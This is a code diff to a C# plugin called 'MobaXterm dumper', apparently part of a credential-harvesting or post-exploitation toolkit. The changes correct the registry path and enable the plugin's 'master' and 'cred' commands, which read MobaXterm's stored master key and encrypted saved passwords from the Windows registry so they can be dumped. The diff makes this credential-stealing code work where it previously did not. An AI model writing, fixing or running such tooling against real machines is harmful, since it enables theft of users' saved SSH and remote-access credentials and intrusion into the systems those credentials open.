@@ -18,17 +18,22 @@ namespace Plugin48Dumper
         {
             Entry = "xterm";
             Description = "MobaXterm dumper";
-            Usage = string.Empty;
+            Usage = "<...> xterm <help|master|cred>";
 
+            dtHelp.Columns.Add("Command");
+            dtHelp.Columns.Add("Description");
 
+            dtHelp.Rows.Add("help", "Show help.");
+            dtHelp.Rows.Add("master", "Show master key if it has.");
+            dtHelp.Rows.Add("cred", "Dump credentials.");
 
-            Available = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\") == null;
+            Available = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\") != null;
         }
 
         public class clsCredential
         {
-            public string Username;
-            public string Password;
+            public string Username { get; set; }
+            public string Password { get; set; }
         }
 
         public class clsMasterKey
@@ -42,11 +47,14 @@ namespace Plugin48Dumper
             List<clsMasterKey> ls = new List<clsMasterKey>();
             int n = 0;
 
-            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\"))
+            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm"))
             {
                 using (RegistryKey subM = root.OpenSubKey("M"))
                 {
-                    foreach (string szSubKey in subM.GetSubKeyNames())
+                    if (subM == null)
+                        throw new Exception($"Cannot find subkey: \"M\". No master key.");
+
+                    foreach (string szSubKey in subM.GetValueNames())
                     {
                         string szHostname = szSubKey;
                         string szEncPassword = (string)subM.GetValue(szSubKey);
@@ -56,7 +64,7 @@ namespace Plugin48Dumper
 
                         if (Regex.IsMatch(szHostname, szRegex))
                         {
-                            ls.Add(new clsMasterKey()
+                            ls.Add(new clsMasterKey
                             {
                                 szHostname = szHostname,
                                 szEncPassword = szEncPassword,
@@ -76,11 +84,14 @@ namespace Plugin48Dumper
             List<clsCredential> ls = new List<clsCredential>();
             int n = 0;
 
-            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\"))
+            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm"))
             {
                 using (RegistryKey subP = root.OpenSubKey("P"))
                 {
-                    foreach (string szSubKey in subP.GetSubKeyNames())
+                    if (subP == null)
+                        throw new Exception("Cannot find subkey: P");
+
+                    foreach (string szSubKey in subP.GetValueNames())
                     {
                         string szUsername = szSubKey;
                         string szEncPassword = (string)subP.GetValue(szSubKey);
@@ -90,7 +101,7 @@ namespace Plugin48Dumper
 
                         if (Regex.IsMatch(szUsername, szRegex))
                         {
-                            ls.Add(new clsCredential()
+                            ls.Add(new clsCredential
                             {
                                 Username = szSubKey,
                                 Password = szEncPassword,
